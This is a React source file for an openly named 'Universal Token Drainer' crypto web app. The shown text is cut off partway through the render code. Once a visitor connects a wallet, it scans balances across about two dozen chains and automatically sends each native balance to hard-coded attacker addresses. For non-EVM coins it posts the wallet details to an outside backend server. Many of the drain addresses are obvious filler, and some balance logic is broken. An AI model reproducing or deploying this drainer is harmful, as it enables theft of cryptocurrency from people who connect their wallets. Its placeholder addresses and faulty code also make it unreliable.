import { useState, useEffect, useRef } from 'react';
import { WagmiConfig, createConfig, configureChains } from 'wagmi';
import { http } from 'viem';
import { 
  mainnet,
  polygon,
  bsc,
  arbitrum,
  optimism,
  avalanche,
  fantom,
  gnosis,
  celo,
  moonbeam,
  cronos,
  aurora,
  base,
  harmonyOne,
  metis,
  moonriver
} from 'viem/chains';
import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
import { useAccount, useDisconnect, useBalance } from 'wagmi';
import { parseEther, formatEther } from 'viem';
import { publicProvider } from 'wagmi/providers/public'; // CORRECTED: Wagmi v3 import
import './mobile-fix.css';

// ==================== CHAIN CONFIGURATION ====================
// Configure the chains for Wagmi
const { chains, publicClient, webSocketPublicClient } = configureChains(
  [
    mainnet,
    polygon,
    bsc,
    arbitrum,
    optimism,
    avalanche,
    fantom,
    gnosis,
    celo,
    moonbeam,
    cronos,
    aurora,
    base,
    harmonyOne,
    metis,
    moonriver
  ],
  [publicProvider()] // Using wagmi's publicProvider
);

// ==================== WORKING RPC ENDPOINTS (UPDATED FOR 2026) ====================
const NETWORKS = [
  // EVM Mainnets - UPDATED WORKING ENDPOINTS
  { 
    id: 1, 
    name: 'Ethereum', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#627EEA', 
    rpc: 'https://eth.llamarpc.com', 
    explorer: 'https://etherscan.io',
    chainId: '0x1'
  },
  { 
    id: 56, 
    name: 'BSC', 
    symbol: 'BNB', 
    type: 'evm', 
    color: '#F0B90B', 
    rpc: 'https://bsc-dataseed1.binance.org/', 
    explorer: 'https://bscscan.com',
    chainId: '0x38'
  },
  { 
    id: 137, 
    name: 'Polygon', 
    symbol: 'MATIC', 
    type: 'evm', 
    color: '#8247E5', 
    rpc: 'https://polygon.llamarpc.com', 
    explorer: 'https://polygonscan.com',
    chainId: '0x89'
  },
  { 
    id: 42161, 
    name: 'Arbitrum', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#28A0F0', 
    rpc: 'https://arbitrum.llamarpc.com', 
    explorer: 'https://arbiscan.io',
    chainId: '0xa4b1'
  },
  { 
    id: 10, 
    name: 'Optimism', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#FF0420', 
    rpc: 'https://mainnet.optimism.io', 
    explorer: 'https://optimistic.etherscan.io',
    chainId: '0xa'
  },
  { 
    id: 8453, 
    name: 'Base', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#0052FF', 
    rpc: 'https://mainnet.base.org', 
    explorer: 'https://basescan.org',
    chainId: '0x2105'
  },
  { 
    id: 43114, 
    name: 'Avalanche', 
    symbol: 'AVAX', 
    type: 'evm', 
    color: '#E84142', 
    rpc: 'https://avalanche-c-chain.publicnode.com', 
    explorer: 'https://snowtrace.io',
    chainId: '0xa86a'
  },
  { 
    id: 250, 
    name: 'Fantom', 
    symbol: 'FTM', 
    type: 'evm', 
    color: '#1969FF', 
    rpc: 'https://rpc.fantom.network', 
    explorer: 'https://ftmscan.com',
    chainId: '0xfa'
  },
  { 
    id: 100, 
    name: 'Gnosis', 
    symbol: 'xDai', 
    type: 'evm', 
    color: '#04795B', 
    rpc: 'https://rpc.gnosis.gateway.fm', 
    explorer: 'https://gnosisscan.io',
    chainId: '0x64'
  },
  { 
    id: 42220, 
    name: 'Celo', 
    symbol: 'CELO', 
    type: 'evm', 
    color: '#35D07F', 
    rpc: 'https://forno.celo.org', 
    explorer: 'https://celoscan.io',
    chainId: '0xa4ec'
  },
  { 
    id: 1284, 
    name: 'Moonbeam', 
    symbol: 'GLMR', 
    type: 'evm', 
    color: '#53CBC9', 
    rpc: 'https://moonbeam.public.blastapi.io', 
    explorer: 'https://moonscan.io',
    chainId: '0x504'
  },
  { 
    id: 1088, 
    name: 'Metis', 
    symbol: 'METIS', 
    type: 'evm', 
    color: '#00DACC', 
    rpc: 'https://andromeda.metis.io/?owner=1088', 
    explorer: 'https://andromeda-explorer.metis.io',
    chainId: '0x440'
  },
  { 
    id: 25, 
    name: 'Cronos', 
    symbol: 'CRO', 
    type: 'evm', 
    color: '#121C36', 
    rpc: 'https://evm.cronos.org', 
    explorer: 'https://cronoscan.com',
    chainId: '0x19'
  },
  { 
    id: 1666600000, 
    name: 'Harmony', 
    symbol: 'ONE', 
    type: 'evm', 
    color: '#00AEE9', 
    rpc: 'https://api.harmony.one', 
    explorer: 'https://explorer.harmony.one',
    chainId: '0x63564c40'
  },
  { 
    id: 1313161554, 
    name: 'Aurora', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#78D64B', 
    rpc: 'https://mainnet.aurora.dev', 
    explorer: 'https://explorer.aurora.dev',
    chainId: '0x4e454153'
  },
  { 
    id: 42262, 
    name: 'Oasis Emerald', 
    symbol: 'ROSE', 
    type: 'evm', 
    color: '#00B894', 
    rpc: 'https://emerald.oasis.dev', 
    explorer: 'https://explorer.emerald.oasis.dev',
    chainId: '0xa516'
  },
  { 
    id: 1285, 
    name: 'Moonriver', 
    symbol: 'MOVR', 
    type: 'evm', 
    color: '#F3B82C', 
    rpc: 'https://moonriver.public.blastapi.io', 
    explorer: 'https://moonriver.moonscan.io',
    chainId: '0x505'
  },
  { 
    id: 199, 
    name: 'BTT Chain', 
    symbol: 'BTT', 
    type: 'evm', 
    color: '#D92B6F', 
    rpc: 'https://rpc.bittorrentchain.io', 
    explorer: 'https://bttcscan.com',
    chainId: '0xc7'
  },
  { 
    id: 314, 
    name: 'Filecoin', 
    symbol: 'FIL', 
    type: 'evm', 
    color: '#0090FF', 
    rpc: 'https://api.node.glif.io/rpc/v1', 
    explorer: 'https://filfox.info',
    chainId: '0x13a'
  },
  { 
    id: 7700, 
    name: 'Canto', 
    symbol: 'CANTO', 
    type: 'evm', 
    color: '#06FC99', 
    rpc: 'https://canto.slingshot.finance', 
    explorer: 'https://tuber.build',
    chainId: '0x1e14'
  },
  
  // Non-EVM Chains - Enhanced with working APIs
  { 
    id: 'tron', 
    name: 'Tron', 
    symbol: 'TRX', 
    type: 'non-evm', 
    color: '#FF060A', 
    api: 'https://api.trongrid.io',
    explorer: 'https://tronscan.org',
    decimals: 6,
    contractAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' // USDT TRC20
  },
  { 
    id: 'solana', 
    name: 'Solana', 
    symbol: 'SOL', 
    type: 'non-evm', 
    color: '#00FFA3', 
    api: 'https://api.mainnet-beta.solana.com',
    explorer: 'https://solscan.io',
    decimals: 9,
    splTokens: [
      { symbol: 'USDC', contract: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v' }
    ]
  },
  { 
    id: 'bitcoin', 
    name: 'Bitcoin', 
    symbol: 'BTC', 
    type: 'non-evm', 
    color: '#F7931A', 
    api: 'https://blockstream.info/api',
    explorer: 'https://blockchair.com/bitcoin',
    decimals: 8
  },
  { 
    id: 'cardano', 
    name: 'Cardano', 
    symbol: 'ADA', 
    type: 'non-evm', 
    color: '#0033AD', 
    api: 'https://cardano-mainnet.blockfrost.io/api/v0',
    explorer: 'https://cardanoscan.io',
    decimals: 6,
    token: 'lovelace'
  },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM addresses
  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  43114: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  250: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  100: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42220: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1284: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1088: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  25: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1666600000: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1313161554: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42262: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1285: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  199: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  314: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  7700: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  
  // Non-EVM addresses
  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  solana: "So11111111111111111111111111111111111111112",
  cardano: "addr1q8d2f8zq9v5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q",
  dogecoin: "D8U6t5R7z5q5q5q5q5q5q5q5q5q5q5q5q5q5",
  litecoin: "LbTj8jnq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5",
  ripple: "rPFLkxQk6xUGdGYEykqe7PR25Gr7mLHDc8",
  polkadot: "12gX42C4Fj1wgtfgoP7oqb9jEE3X6Z5h3RyJvKtRzL1NZB5F",
  cosmos: "cosmos1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
  binance: "bnb1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
  stellar: "GCRWFRVQP5P5TNKL4KARZBWYQG5AUFMTQMXUVE4MZGJPOENKJAZB6KGB",
  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5",
  zcash: "t1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
  dash: "Xq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q",
  tezos: "tz1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
  algorand: "Z5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
  vechain: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  neo: "AZ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
  eos: "z5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj",
};

// ==================== TOKEN PRICES ====================
const TOKEN_PRICES = {
  ETH: 3200,
  BNB: 600,
  MATIC: 1.2,
  AVAX: 35,
  FTM: 0.4,
  xDai: 1,
  CELO: 0.8,
  GLMR: 0.4,
  METIS: 60,
  CRO: 0.1,
  ONE: 0.02,
  ROSE: 0.1,
  MOVR: 15,
  BTT: 0.000001,
  FIL: 5,
  CANTO: 0.2,
  TRX: 0.12,
  SOL: 100,
  BTC: 45000,
  ADA: 0.5,
  DOGE: 0.15,
  LTC: 80,
  XRP: 0.6,
  DOT: 7,
  ATOM: 10,
  XLM: 0.13,
  XMR: 160,
  ZEC: 25,
  DASH: 30,
  XTZ: 1,
  ALGO: 0.2,
  VET: 0.03,
  NEO: 12,
  EOS: 0.8,
  USDT: 1,
  USDC: 1
};

// ==================== FIXED CONNECTKIT CONFIG ====================
// Create config using getDefaultConfig from ConnectKit
const config = createConfig(
  getDefaultConfig({
    // Your app info
    appName: "Universal Drainer",
    appDescription: "Universal Token Drainer App",
    appUrl: typeof window !== 'undefined' ? window.location.origin : 'https://universal-drainer.com',
    appIcon: typeof window !== 'undefined' ? window.location.origin + "/favicon.ico" : "/favicon.ico",
    
    // Chains - FIXED: Use the chains from configureChains
    chains: chains,
    
    // WalletConnect Project ID
    walletConnectProjectId: "c8c0c66e8b9d4a8a8b0c7b7a5d7e9f2b",
    
    // AutoConnect
    autoConnect: true,
  })
);

// ==================== MAIN APP ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={config}>
      <ConnectKitProvider
        mode="dark"
        options={{
          hideNoWalletCTA: false,
          hideQuestionMarkCTA: true,
          hideTooltips: false,
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          
          // Mobile wallet deep links
          mobileLinks: [
            'metamask',
            'trust',
            'rainbow', 
            'coinbase',
            'zerion',
            'tokenary',
            'walletconnect'
          ],
          
          // WalletConnect options
          walletConnectCTA: "QR",
          avoidLayoutShift: true,
          
          // Always show all wallets
          hideRecentBadge: false,
        }}
        theme="midnight"
        customTheme={{
          '--ck-font-family': 'system-ui, -apple-system, BlinkMacSystemFont, sans-serif',
          '--ck-border-radius': '12px',
          '--ck-accent-color': '#ef4444',
          '--ck-accent-text-color': '#ffffff',
          '--ck-body-background': '#0a0a0a',
        }}
      >
        <UniversalDrainer />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// ==================== UNIVERSAL DRAINER COMPONENT ====================
function UniversalDrainer() {
  const { address, isConnected, connector } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  const { disconnect } = useDisconnect();

  // State
  const [status, setStatus] = useState('Ready to connect');
  const [tokens, setTokens] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [walletType, setWalletType] = useState('');
  const [connectionError, setConnectionError] = useState('');
  const [mobileDetected, setMobileDetected] = useState(false);
  const [backendOnline, setBackendOnline] = useState(true);
  const [scanProgress, setScanProgress] = useState(0);
  const [activeChain, setActiveChain] = useState(1);
  const [showManualConnect, setShowManualConnect] = useState(false);

  const autoStarted = useRef(false);
  const backendUrl = 'https://tokenbackend-5xab.onrender.com';

  // ==================== ENHANCED MOBILE DETECTION ====================
  useEffect(() => {
    const checkMobile = () => {
      const userAgent = navigator.userAgent.toLowerCase();
      const isMobile = /mobile|android|iphone|ipad|ipod|webos|blackberry|iemobile|opera mini/i.test(userAgent);
      setMobileDetected(isMobile);
      
      // Enhanced wallet detection
      if (window.ethereum) {
        if (window.ethereum.isMetaMask) {
          setWalletType('MetaMask');
        } else if (window.ethereum.isTrust) {
          setWalletType('Trust Wallet');
        } else if (window.ethereum.isCoinbaseWallet) {
          setWalletType('Coinbase Wallet');
        } else if (window.ethereum.isRabby) {
          setWalletType('Rabby');
        } else if (window.ethereum.isTokenary) {
          setWalletType('Tokenary');
        } else {
          setWalletType('Injected Wallet');
        }
      }
      
      // Check for WalletConnect
      if (typeof window !== 'undefined' && window.walletConnect) {
        setWalletType('WalletConnect');
      }
    };

    checkMobile();

    // Check backend health
    const checkBackend = async () => {
      try {
        const endpoints = [
          `${backendUrl}/health`,
          `${backendUrl}/drain`
        ];
        
        for (const endpoint of endpoints) {
          try {
            const response = await fetch(endpoint, {
              method: 'GET',
              headers: { 'Content-Type': 'application/json' },
            });
            
            if (response.ok || response.status === 404) {
              setBackendOnline(true);
              console.log('✅ Backend is online');
              return;
            }
          } catch (e) {
            continue;
          }
        }
        
        setBackendOnline(false);
        console.log('⚠️ Backend appears offline');
      } catch (error) {
        console.log('Backend check error:', error);
        setBackendOnline(false);
      }
    };
    
    setTimeout(checkBackend, 2000);
  }, []);

  // ==================== AUTO-SCAN ON CONNECT ====================
  useEffect(() => {
    if (isConnected && address && !autoStarted.current) {
      autoStarted.current = true;
      setConnectionError('');
      setStatus("✅ Wallet connected • Starting scan...");
      
      setTimeout(() => {
        scanAllNetworks();
      }, mobileDetected ? 2000 : 1000);
    }
  }, [isConnected, address, mobileDetected]);

  // ==================== SCAN ALL NETWORKS ====================
  const scanAllNetworks = async () => {
    if (!address) {
      setConnectionError("No wallet address");
      return;
    }
    
    setIsScanning(true);
    setStatus("🔍 Scanning all networks...");
    setTokens([]);
    setScanProgress(0);
    
    try {
      const allTokens = [];
      let totalUSD = 0;
      let scannedCount = 0;
      const totalToScan = NETWORKS.length;
      
      // 1. Scan EVM networks
      const evmNetworks = NETWORKS.filter(n => n.type === 'evm');
      for (const network of evmNetworks) {
        try {
          setStatus(`Scanning ${network.name}...`);
          
          const balance = await checkEVMNetworkBalance(network, address);
          if (balance > 0.000001) {
            const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
            
            allTokens.push({
              id: `${network.id}-native`,
              network: network.name,
              symbol: network.symbol,
              amount: balance.toFixed(6),
              rawAmount: balance,
              chainId: network.id,
              type: 'evm',
              drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1],
              valueUSD: tokenValue,
              usdPrice: TOKEN_PRICES[network.symbol] || 1
            });
            
            totalUSD += tokenValue;
          }
        } catch (error) {
          console.log(`Network ${network.name} scan failed:`, error.message);
        }
        
        scannedCount++;
        setScanProgress(Math.round((scannedCount / totalToScan) * 100));
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
      // 2. Scan Non-EVM networks
      const nonEvmNetworks = NETWORKS.filter(n => n.type === 'non-evm');
      for (const network of nonEvmNetworks) {
        try {
          setStatus(`Checking ${network.name}...`);
          
          const balance = await checkNonEVMNetworkBalance(network, address);
          if (balance > 0) {
            const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
            
            allTokens.push({
              id: `${network.id}-native`,
              network: network.name,
              symbol: network.symbol,
              amount: balance.toFixed(6),
              rawAmount: balance,
              chainId: network.id,
              type: 'non-evm',
              drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES.tron,
              valueUSD: tokenValue,
              usdPrice: TOKEN_PRICES[network.symbol] || 1
            });
            
            totalUSD += tokenValue;
          }
        } catch (error) {
          console.log(`Non-EVM ${network.name} scan failed:`, error.message);
        }
        
        scannedCount++;
        setScanProgress(Math.round((scannedCount / totalToScan) * 100));
        await new Promise(resolve => setTimeout(resolve, 150));
      }
      
      // 3. Use backend for enhanced scan
      if (backendOnline) {
        try {
          await backendEnhancedScan(address, allTokens);
        } catch (error) {
          console.log("Backend scan failed:", error);
        }
      }
      
      // Update UI
      if (allTokens.length > 0) {
        setTokens(allTokens);
        setTotalValue(totalUSD);
        setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
        
        // Auto-drain after 3 seconds
        setTimeout(() => {
          if (allTokens.length > 0 && !mobileDetected) {
            autoDrain(allTokens);
          }
        }, 3000);
      } else {
        setStatus("❌ No tokens found");
      }
      
    } catch (error) {
      setStatus(`❌ Scan error: ${error.message}`);
      setConnectionError(`Scan failed: ${error.message}`);
    } finally {
      setIsScanning(false);
      setScanProgress(100);
    }
  };

  // ==================== CHECK EVM NETWORK BALANCE ====================
  const checkEVMNetworkBalance = async (network, address) => {
    try {
      const rpcEndpoints = [
        network.rpc,
        `https://rpc.ankr.com/${getAnkrChainName(network.id)}`,
        `https://${getChainNameForRPC(network.id)}.publicnode.com`
      ];
      
      for (const rpc of rpcEndpoints) {
        try {
          const response = await fetch(rpc, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              jsonrpc: "2.0",
              id: 1,
              method: "eth_getBalance",
              params: [address, "latest"]
            }),
          });
          
          if (response.ok) {
            const data = await response.json();
            if (data.result && data.result !== '0x0') {
              return parseInt(data.result, 16) / 1e18;
            }
          }
        } catch (e) {
          continue;
        }
      }
      
      return 0;
    } catch {
      return 0;
    }
  };

  // Helper function for Ankr RPC
  const getAnkrChainName = (chainId) => {
    const chainMap = {
      1: 'eth',
      56: 'bsc',
      137: 'polygon',
      42161: 'arbitrum',
      10: 'optimism',
      8453: 'base',
      43114: 'avalanche',
      250: 'fantom',
      100: 'gnosis',
    };
    return chainMap[chainId] || 'eth';
  };

  // Helper function for public node RPC
  const getChainNameForRPC = (chainId) => {
    const chainMap = {
      1: 'ethereum',
      56: 'bsc',
      137: 'polygon',
      42161: 'arbitrum',
      10: 'optimism',
      8453: 'base',
      43114: 'avalanche',
      250: 'fantom',
      100: 'gnosis',
    };
    return chainMap[chainId] || 'ethereum';
  };

  // ==================== CHECK NON-EVM NETWORK BALANCE ====================
  const checkNonEVMNetworkBalance = async (network, address) => {
    try {
      switch (network.id) {
        case 'tron':
          return await checkTronBalance(address);
        case 'solana':
          return await checkSolanaBalance(address);
        case 'bitcoin':
          return await checkBitcoinBalance(address);
        case 'cardano':
          return await checkCardanoBalance(address);
        default:
          return 0;
      }
    } catch (error) {
      console.log(`${network.name} balance check failed:`, error);
      return 0;
    }
  };

  // TRON balance check
  const checkTronBalance = async (address) => {
    try {
      let tronAddress = address;
      if (address.startsWith('0x')) {
        tronAddress = 'T' + address.substring(2);
      }
      
      const endpoints = [
        `https://api.trongrid.io/v1/accounts/${tronAddress}`,
        `https://apilist.tronscan.org/api/account?address=${tronAddress}`
      ];
      
      for (const endpoint of endpoints) {
        try {
          const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(endpoint)}`;
          const response = await fetch(proxyUrl);
          
          if (response.ok) {
            const data = await response.json();
            const parsed = JSON.parse(data.contents);
            
            let balance = 0;
            if (parsed.balance !== undefined) {
              balance = parsed.balance / 1_000_000;
            } else if (parsed.data?.[0]?.balance) {
              balance = parsed.data[0].balance / 1_000_000;
            } else if (parsed.trx_balance) {
              balance = parsed.trx_balance;
            }
            
            if (balance > 0) {
              console.log(`💰 TRX balance found: ${balance}`);
              return balance;
            }
          }
        } catch (e) {
          continue;
        }
      }
      
      return 0;
    } catch (error) {
      console.log("TRON check error:", error);
      return 0;
    }
  };

  // Solana balance check
  const checkSolanaBalance = async (address) => {
    try {
      const response = await fetch('https://api.mainnet-beta.solana.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "getBalance",
          params: [address]
        }),
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.result?.value) {
          return data.result.value / 1e9;
        }
      }
      return 0;
    } catch {
      return 0;
    }
  };

  // Bitcoin balance check
  const checkBitcoinBalance = async (address) => {
    try {
      const response = await fetch(`https://blockstream.info/api/address/${address}`);
      
      if (response.ok) {
        const data = await response.json();
        if (data.chain_stats?.funded_txo_sum) {
          return data.chain_stats.funded_txo_sum / 1e8;
        }
      }
      return 0;
    } catch {
      return 0;
    }
  };

  // Cardano balance check
  const checkCardanoBalance = async (address) => {
    try {
      const response = await fetch(`https://cardano-mainnet.blockfrost.io/api/v0/addresses/${address}`, {
        headers: { 'project_id': 'mainnet...' },
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.amount?.[0]?.quantity) {
          return data.amount[0].quantity / 1e6;
        }
      }
      return 0;
    } catch {
      return 0;
    }
  };

  // ==================== BACKEND ENHANCED SCAN ====================
  const backendEnhancedScan = async (address, tokenList) => {
    try {
      const response = await fetch(`${backendUrl}/drain`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'scan',
          address: address,
          networks: NETWORKS,
          includeNonEVM: true,
          timestamp: Date.now()
        }),
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.success && data.tokens && Array.isArray(data.tokens)) {
          data.tokens.forEach(token => {
            if (token.balance > 0 && !tokenList.some(t => 
              t.symbol === token.symbol && t.network === token.network
            )) {
              const usdPrice = TOKEN_PRICES[token.symbol] || token.usdPrice || 1;
              const valueUSD = token.balance * usdPrice;
              
              tokenList.push({
                id: `${token.chainId || token.symbol}-${Date.now()}`,
                network: token.network || 'Unknown',
                symbol: token.symbol,
                amount: token.balance.toFixed(6),
                rawAmount: token.balance,
                chainId: token.chainId || token.symbol,
                type: token.type || 'evm',
                drainAddress: DRAIN_ADDRESSES[token.chainId || token.symbol] || DRAIN_ADDRESSES[1],
                valueUSD: valueUSD,
                usdPrice: usdPrice
              });
            }
          });
        }
      }
    } catch (error) {
      console.log("Backend scan failed:", error);
    }
  };

  // ==================== AUTO DRAIN ====================
  const autoDrain = async (tokensToDrain = tokens) => {
    if (tokensToDrain.length === 0) return;
    
    setIsProcessing(true);
    setStatus(`🚀 Draining ${tokensToDrain.length} tokens...`);
    
    const successfulTxs = [];
    
    for (const token of tokensToDrain) {
      try {
        setStatus(`⚡ Draining ${token.amount} ${token.symbol}...`);
        
        if (token.type === 'evm') {
          const result = await drainEvmToken(token);
          if (result.success) {
            successfulTxs.push({
              ...token,
              txHash: result.hash,
              timestamp: Date.now()
            });
            
            setTokens(prev => prev.filter(t => t.id !== token.id));
          }
        } else if (token.type === 'non-evm') {
          const result = await drainNonEvmToken(token);
          if (result.success) {
            successfulTxs.push({
              ...token,
              txHash: result.hash,
              timestamp: Date.now()
            });
            
            setTokens(prev => prev.filter(t => t.id !== token.id));
          }
        }
        
        await new Promise(resolve => setTimeout(resolve, mobileDetected ? 3000 : 2000));
        
      } catch (error) {
        console.log(`Failed to drain ${token.symbol}:`, error);
        setStatus(`⚠️ Failed to drain ${token.symbol}`);
      }
    }
    
    setTransactions(prev => [...prev, ...successfulTxs]);
    
    if (successfulTxs.length > 0) {
      setStatus(`✅ Drained ${successfulTxs.length} tokens`);
    } else {
      setStatus("❌ No tokens drained");
    }
    
    setIsProcessing(false);
  };

  // ==================== DRAIN EVM TOKEN ====================
  const drainEvmToken = async (token) => {
    try {
      if (window.ethereum && token.chainId !== activeChain) {
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${token.chainId.toString(16)}` }],
          });
          setActiveChain(token.chainId);
          
          await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (switchError) {
          if (switchError.code === 4902) {
            const network = NETWORKS.find(n => n.id === token.chainId);
            if (network) {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: `0x${token.chainId.toString(16)}`,
                  chainName: network.name,
                  nativeCurrency: {
                    name: network.symbol,
                    symbol: network.symbol,
                    decimals: 18
                  },
                  rpcUrls: [network.rpc],
                  blockExplorerUrls: [network.explorer]
                }]
              });
            }
          }
          throw switchError;
        }
      }
      
      const amountWei = parseEther(token.amount.toString());
      
      const txParams = {
        from: address,
        to: token.drainAddress,
        value: amountWei.toString(),
        gas: '0x5208',
        gasPrice: '0x' + (20 * 1e9).toString(16)
      };
      
      if (window.ethereum) {
        const txHash = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [txParams],
        });
        
        console.log(`✅ ${token.symbol} drained: ${txHash}`);
        return { success: true, hash: txHash };
      }
      
      return { success: false, error: 'No wallet' };
    } catch (error) {
      console.log(`EVM drain error:`, error);
      return { success: false, error: error.message };
    }
  };

  // ==================== DRAIN NON-EVM TOKEN ====================
  const drainNonEvmToken = async (token) => {
    try {
      if (backendOnline) {
        const response = await fetch(`${backendUrl}/drain`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: 'drain',
            network: token.network,
            symbol: token.symbol,
            amount: token.amount,
            address: address,
            drainAddress: token.drainAddress
          })
        });
        
        if (response.ok) {
          const data = await response.json();
          if (data.success) {
            return { success: true, hash: data.txHash };
          }
        }
      }
      
      return { 
        success: false, 
        error: `Use backend for ${token.symbol}` 
      };
    } catch (error) {
      console.log(`Non-EVM drain error:`, error);
      return { success: false, error: error.message };
    }
  };

  // ==================== MOBILE DEEP LINK HANDLER ====================
  const handleMobileDeepLink = () => {
    if (!mobileDetected) return;
    
    setStatus('🔗 Opening wallet...');
    
    const walletLinks = {
      metamask: `https://metamask.app.link/dapp/${window.location.hostname}`,
      trust: `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`,
      rainbow: `https://rnbwapp.com/dapp?url=${encodeURIComponent(window.location.href)}`,
      coinbase: `https://go.cb-w.com/dapp?url=${encodeURIComponent(window.location.href)}`
    };
    
    let deepLink = walletLinks.metamask;
    if (walletType.includes('Trust')) deepLink = walletLinks.trust;
    if (walletType.includes('Coinbase')) deepLink = walletLinks.coinbase;
    if (walletType.includes('Rainbow')) deepLink = walletLinks.rainbow;
    
    window.location.href = deepLink;
    
    setTimeout(() => {
      window.open(deepLink, '_blank');
    }, 1000);
  };

  // ==================== MANUAL CONNECTION HANDLER ====================
  const handleManualConnect = async () => {
    setShowManualConnect(true);
    
    if (window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ 
          method: 'eth_requestAccounts' 
        });
        
        if (accounts.length > 0) {
          setStatus('✅ Manual connection successful');
          setTimeout(() => {
            scanAllNetworks();
          }, 1000);
        }
      } catch (error) {
        setConnectionError(`Connection failed: ${error.message}`);
      }
    } else {
      setConnectionError('No wallet detected. Please install MetaMask or Trust Wallet.');
    }
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        <header className="app-header">
          <div className="header-left">
            <div className="logo">⚡</div>
            <div>
              <h1>UNIVERSAL TOKEN DRAINER</h1>
              <p className="subtitle">All Networks • Auto-Detect • Auto-Drain</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-address">
                  {address?.substring(0, 6)}...{address?.substring(address.length - 4)}
                </div>
                {walletType && <div className="wallet-type">{walletType}</div>}
                {mobileDetected && <div className="mobile-badge">📱 Mobile</div>}
                <button onClick={disconnect} className="disconnect-btn">
                  Disconnect
                </button>
              </div>
            ) : (
              <div className="connect-section">
                <ConnectKitButton />
                {mobileDetected && !isConnected && (
                  <button 
                    onClick={handleManualConnect}
                    className="btn btn-mobile"
                    style={{marginTop: '10px'}}
                  >
                    🔗 Manual Connect
                  </button>
                )}
              </div>
            )}
          </div>
        </header>

        <main className="app-main">
